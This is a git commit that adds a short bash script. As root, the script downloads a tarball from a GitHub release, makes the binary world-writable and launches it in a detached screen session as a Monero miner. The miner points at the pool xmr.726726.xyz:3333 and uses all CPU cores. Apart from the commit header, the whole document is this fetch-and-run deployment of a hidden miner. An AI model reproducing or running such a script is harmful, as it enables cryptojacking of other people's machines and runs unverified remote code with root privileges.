4d1edb8cc76b1229fe3339c928ff77b835396f1d
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2022-09-20 22:13:43 +0800

    Add files via upload

---
+++ m426.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo -i <<EOF
+wget https://github.com/yuqingkj/mine_xmr/releases/download/6.18.0/m426.tar.gz
+tar -xvf m426.tar.gz
+cd m426/
+chmod 777 ./m426
+screen -dmS xmr
+screen -x -S xmr -p 0 -X stuff "./m426 -o xmr.726726.xyz:3333 --rig-id az -t $(nproc) \n"
+echo ok
+EOF
